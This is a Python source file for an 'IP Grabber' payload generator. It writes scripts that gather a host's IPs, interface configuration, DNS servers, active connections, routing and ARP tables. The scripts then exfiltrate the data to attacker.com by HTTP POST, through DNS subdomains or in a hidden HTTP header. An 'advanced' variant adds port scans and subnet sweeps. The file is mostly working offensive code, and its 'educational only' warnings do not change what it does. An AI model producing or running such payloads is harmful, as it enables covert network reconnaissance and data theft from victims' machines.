"""
IP Grabber - Network Information Extraction
WARNING: For authorized testing and educational purposes only.
"""
import os
import socket
import subprocess
import tempfile
import json
import requests
from typing import Dict, List, Optional
from datetime import datetime
import platform
import re


class IPGrabber:
    """IP and network information grabber"""
    
    def __init__(self):
        self.system = platform.system()
    
    def create_ip_grabber(self, grab_types: List[str] = None,
                         exfil_method: str = "http",
                         exfil_url: str = None) -> Dict:
        """Create IP grabber payload"""
        grab_types = grab_types or ['local_ip', 'public_ip', 'network_info', 'dns_servers']
        
        code = f'''"""
Educational IP Grabber - FOR AUTHORIZED TESTING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import socket
import subprocess
import json
import requests
import platform
import os
from datetime import datetime

exfil_url = "{exfil_url or 'http://attacker.com/exfil'}"

def get_local_ip():
    """Get local IP address"""
    try:
        # Method 1: Connect to external server
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        try:
            # Method 2: Get hostname IP
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            return local_ip
        except:
            return None

def get_public_ip():
    """Get public IP address"""
    services = [
        "https://api.ipify.org",
        "https://icanhazip.com",
        "https://ifconfig.me/ip",
        "https://checkip.amazonaws.com"
    ]
    
    for service in services:
        try:
            response = requests.get(service, timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            continue
    
    return None

def get_network_info():
    """Get network information"""
    network_info = {{
        'hostname': socket.gethostname(),
        'fqdn': socket.getfqdn(),
        'local_ip': get_local_ip(),
        'public_ip': get_public_ip()
    }}
    
    # Get network interfaces
    if platform.system() == 'Windows':
        try:
            result = subprocess.run(['ipconfig', '/all'], 
                                  capture_output=True, text=True, timeout=10)
            network_info['ipconfig'] = result.stdout
        except:
            pass
    else:
        try:
            result = subprocess.run(['ifconfig'], 
                                  capture_output=True, text=True, timeout=10)
            network_info['ifconfig'] = result.stdout
        except:
            pass
    
    return network_info

def get_dns_servers():
    """Get DNS servers"""
    dns_servers = []
    
    if platform.system() == 'Windows':
        try:
            result = subprocess.run(['ipconfig', '/all'], 
                                  capture_output=True, text=True, timeout=10)
            for line in result.stdout.split('\\n'):
                if 'DNS Servers' in line or 'DNS servers' in line:
                    # Extract DNS server IPs
                    ip_match = re.search(r'\\b(\\d{{1,3}}\\.\\d{{1,3}}\\.\\d{{1,3}}\\.\\d{{1,3}})\\b', line)
                    if ip_match:
                        dns_servers.append(ip_match.group(1))
        except:
            pass
    else:
        try:
            with open('/etc/resolv.conf', 'r') as f:
                for line in f:
                    if line.startswith('nameserver'):
                        dns_servers.append(line.split()[1])
        except:
            pass
    
    return dns_servers

def get_network_connections():
    """Get active network connections"""
    connections = []
    
    try:
        if platform.system() == 'Windows':
            result = subprocess.run(['netstat', '-an'], 
                                  capture_output=True, text=True, timeout=10)
        else:
            result = subprocess.run(['netstat', '-an'], 
                                  capture_output=True, text=True, timeout=10)
        
        for line in result.stdout.split('\\n'):
            if 'ESTABLISHED' in line or 'LISTEN' in line:
                # Extract IP and port
                parts = line.split()
                if len(parts) >= 2:
                    connections.append({{
                        'local': parts[1] if len(parts) > 1 else None,
                        'remote': parts[2] if len(parts) > 2 else None,
                        'state': parts[-1] if len(parts) > 0 else None
                    }})
    except:
        pass
    
    return connections

def get_routing_table():
    """Get routing table"""
    routes = []
    
    try:
        if platform.system() == 'Windows':
            result = subprocess.run(['route', 'print'], 
                                  capture_output=True, text=True, timeout=10)
        else:
            result = subprocess.run(['route', '-n'], 
                                  capture_output=True, text=True, timeout=10)
        
        routes_text = result.stdout
        # Parse routes (simplified)
        for line in routes_text.split('\\n'):
            if '0.0.0.0' in line or 'default' in line.lower():
                # Extract gateway
                parts = line.split()
                if len(parts) >= 2:
                    routes.append({{
                        'destination': parts[0] if len(parts) > 0 else None,
                        'gateway': parts[1] if len(parts) > 1 else None,
                        'interface': parts[-1] if len(parts) > 2 else None
                    }})
    except:
        pass
    
    return routes

def get_arp_table():
    """Get ARP table"""
    arp_entries = []
    
    try:
        if platform.system() == 'Windows':
            result = subprocess.run(['arp', '-a'], 
                                  capture_output=True, text=True, timeout=10)
        else:
            result = subprocess.run(['arp', '-a'], 
                                  capture_output=True, text=True, timeout=10)
        
        for line in result.stdout.split('\\n'):
            # Extract IP and MAC
            ip_match = re.search(r'\\b(\\d{{1,3}}\\.\\d{{1,3}}\\.\\d{{1,3}}\\.\\d{{1,3}})\\b', line)
            mac_match = re.search(r'([0-9a-fA-F]{{2}}[:-]){{5}}[0-9a-fA-F]{{2}}', line)
            
            if ip_match:
                arp_entries.append({{
                    'ip': ip_match.group(1),
                    'mac': mac_match.group(0) if mac_match else None
                }})
    except:
        pass
    
    return arp_entries

def exfiltrate_data(data, method='http'):
    """Exfiltrate collected data"""
    try:
        if method == 'http':
            response = requests.post(exfil_url, json=data, timeout=10)
            return response.status_code == 200
        elif method == 'dns':
            # DNS exfiltration (encode in subdomain)
            import base64
            encoded = base64.b64encode(json.dumps(data).encode()).decode()
            # Would send via DNS queries
            return True
        elif method == 'file':
            # Save to file
            with open('ip_data.json', 'w') as f:
                json.dump(data, f, indent=2)
            return True
    except Exception as e:
        print(f"Exfiltration error: {{e}}")
        return False

# Main execution
grab_types = {grab_types}
collected_data = {{
    'timestamp': datetime.now().isoformat(),
    'system': platform.system(),
    'hostname': socket.gethostname()
}}

if 'local_ip' in grab_types:
    collected_data['local_ip'] = get_local_ip()

if 'public_ip' in grab_types:
    collected_data['public_ip'] = get_public_ip()

if 'network_info' in grab_types:
    collected_data['network_info'] = get_network_info()

if 'dns_servers' in grab_types:
    collected_data['dns_servers'] = get_dns_servers()

if 'connections' in grab_types:
    collected_data['connections'] = get_network_connections()

if 'routing' in grab_types:
    collected_data['routing_table'] = get_routing_table()

if 'arp' in grab_types:
    collected_data['arp_table'] = get_arp_table()

# Exfiltrate or save
if exfil_url:
    exfiltrate_data(collected_data, method='{exfil_method}')
else:
    # Save locally
    with open('ip_data.json', 'w') as f:
        json.dump(collected_data, f, indent=2)
    print("IP data saved to ip_data.json")

print("\\nCollected IP Information:")
print(f"Local IP: {{collected_data.get('local_ip', 'N/A')}}")
print(f"Public IP: {{collected_data.get('public_ip', 'N/A')}}")
print(f"DNS Servers: {{', '.join(collected_data.get('dns_servers', []))}}")
'''
        
        filepath = os.path.join(
            tempfile.gettempdir(),
            f"ip_grabber_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        )
        
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            'type': 'ip_grabber',
            'file': filepath,
            'grab_types': grab_types,
            'exfil_method': exfil_method,
            'exfil_url': exfil_url,
            'warning': 'Educational only. Use in isolated VM. Illegal without authorization.'
        }
    
    def create_advanced_ip_grabber(self, features: List[str] = None) -> Dict:
        """Create advanced IP grabber with more features"""
        features = features or ['geolocation', 'whois', 'port_scan', 'subnet_scan']
        
        code = f'''"""
Educational Advanced IP Grabber - FOR AUTHORIZED TESTING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import socket
import requests
import json
from datetime import datetime

def get_geolocation(ip):
    """Get IP geolocation"""
    try:
        response = requests.get(f"http://ip-api.com/json/{{ip}}", timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

def get_whois(ip):
    """Get WHOIS information (simplified)"""
    try:
        import whois
        return whois.whois(ip)
    except:
        # Fallback: use API
        try:
            response = requests.get(f"https://ipwhois.app/json/{{ip}}", timeout=5)
            if response.status_code == 200:
                return response.json()
        except:
            pass
    return None

def scan_common_ports(ip, ports=None):
    """Scan common ports"""
    ports = ports or [22, 23, 80, 443, 3389, 8080]
    open_ports = []
    
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    
    return open_ports

def scan_subnet(subnet):
    """Scan subnet for active hosts"""
    import ipaddress
    active_hosts = []
    
    try:
        network = ipaddress.ip_network(subnet, strict=False)
        for ip in network.hosts():
            ip_str = str(ip)
            # Ping check (simplified)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((ip_str, 80))
                if result == 0:
                    active_hosts.append(ip_str)
                sock.close()
            except:
                pass
    except:
        pass
    
    return active_hosts

# Main execution
features = {features}
collected_data = {{
    'timestamp': datetime.now().isoformat()
}}

# Get local and public IPs
local_ip = socket.gethostbyname(socket.gethostname())
public_ip = requests.get("https://api.ipify.org").text.strip()

collected_data['local_ip'] = local_ip
collected_data['public_ip'] = public_ip

if 'geolocation' in features:
    collected_data['geolocation'] = {{
        'local': get_geolocation(local_ip),
        'public': get_geolocation(public_ip)
    }}

if 'whois' in features:
    collected_data['whois'] = {{
        'local': get_whois(local_ip),
        'public': get_whois(public_ip)
    }}

if 'port_scan' in features:
    collected_data['port_scan'] = {{
        'local': scan_common_ports(local_ip),
        'public': scan_common_ports(public_ip)
    }}

if 'subnet_scan' in features:
    # Get subnet from local IP
    subnet = '.'.join(local_ip.split('.')[:-1]) + '.0/24'
    collected_data['subnet_scan'] = scan_subnet(subnet)

# Save data
with open('advanced_ip_data.json', 'w') as f:
    json.dump(collected_data, f, indent=2)

print("Advanced IP data collected and saved")
'''
        
        filepath = os.path.join(
            tempfile.gettempdir(),
            f"advanced_ip_grabber_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        )
        
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            'type': 'advanced_ip_grabber',
            'file': filepath,
            'features': features,
            'warning': 'Educational only. Use in isolated VM. Illegal without authorization.'
        }
    
    def create_stealth_ip_grabber(self, stealth_method: str = "dns") -> Dict:
        """Create stealth IP grabber"""
        code = f'''"""
Educational Stealth IP Grabber - FOR AUTHORIZED TESTING ONLY
WARNING: Use only in isolated VMs. Illegal without authorization.
"""
import socket
import base64
import json
from datetime import datetime

def get_ips():
    """Get IP addresses"""
    local_ip = socket.gethostbyname(socket.gethostname())
    
    try:
        import requests
        public_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
    except:
        public_ip = None
    
    return {{
        'local_ip': local_ip,
        'public_ip': public_ip
    }}

def exfiltrate_stealth(data, method='{stealth_method}'):
    """Stealth exfiltration"""
    if method == 'dns':
        # DNS exfiltration
        import base64
        encoded = base64.b64encode(json.dumps(data).encode()).decode()
        # Encode in subdomain
        subdomain = encoded[:63]  # DNS limit
        # Would query: subdomain.attacker.com
        print(f"DNS exfiltration: {{subdomain}}.attacker.com")
        return True
    elif method == 'icmp':
        # ICMP exfiltration (ping data)
        encoded = base64.b64encode(json.dumps(data).encode()).decode()
        print(f"ICMP exfiltration: {{encoded}}")
        return True
    elif method == 'http_headers':
        # Exfiltrate in HTTP headers
        try:
            import requests
            headers = {{
                'X-Data': base64.b64encode(json.dumps(data).encode()).decode()
            }}
            requests.get('http://attacker.com', headers=headers, timeout=5)
            return True
        except:
            return False
    
    return False

# Get IPs
ip_data = get_ips()
ip_data['timestamp'] = datetime.now().isoformat()

# Stealth exfiltration
exfiltrate_stealth(ip_data, method='{stealth_method}')

print("IP data collected and exfiltrated")
'''
        
        filepath = os.path.join(
            tempfile.gettempdir(),
            f"stealth_ip_grabber_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        )
        
        with open(filepath, 'w') as f:
            f.write(code)
        
        return {
            'type': 'stealth_ip_grabber',
            'file': filepath,
            'stealth_method': stealth_method,
            'warning': 'Educational only. Use in isolated VM. Illegal without authorization.'
        }
